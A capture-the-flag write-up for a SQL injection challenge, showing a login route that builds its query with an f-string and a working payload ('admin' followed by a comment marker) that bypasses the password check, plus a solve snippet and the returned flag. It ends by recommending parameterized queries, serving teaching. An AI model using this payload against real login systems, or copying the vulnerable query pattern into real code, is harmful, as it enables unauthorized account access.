# sqli-login — Writeup

## The bug

`app.py`'s `/login` route builds its SQL query with an f-string:

```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
cur.execute(query)
```

`username` and `password` come straight from the JSON body, unescaped and
unparameterized. This is classic SQL injection.

## Steps

1. If we send `username = admin' -- ` (note the trailing space after `--`,
   which starts a SQL line comment in SQLite), the query becomes:

   ```sql
   SELECT * FROM users WHERE username = 'admin' -- ' AND password = 'anything'
   ```

2. Everything after `--` is a comment, so the password check is
   completely removed from the query. It's now just:

   ```sql
   SELECT * FROM users WHERE username = 'admin'
   ```

3. This matches the `admin` row regardless of what password we sent, and
   the server returns the flag because `is_admin` is true for that row.

```python
payload = {"username": "admin' -- ", "password": "anything"}
requests.post(f"{base_url}/login", json=payload)
```

## Running it

```
$ python3 solve.py
flag{sql1_1nj3ct10n_never_g3ts_0ld}
```

`solve.py` starts `app.py` as a subprocess (which seeds a fresh SQLite DB
with a random, non-guessable admin password), then sends the injection
payload over HTTP.

## Takeaway

Never build SQL with string formatting/concatenation from user input.
Always use parameterized queries / prepared statements
(`cur.execute("... WHERE username = ? AND password = ?", (username,
password))`), which treat user input strictly as data, never as SQL
syntax.
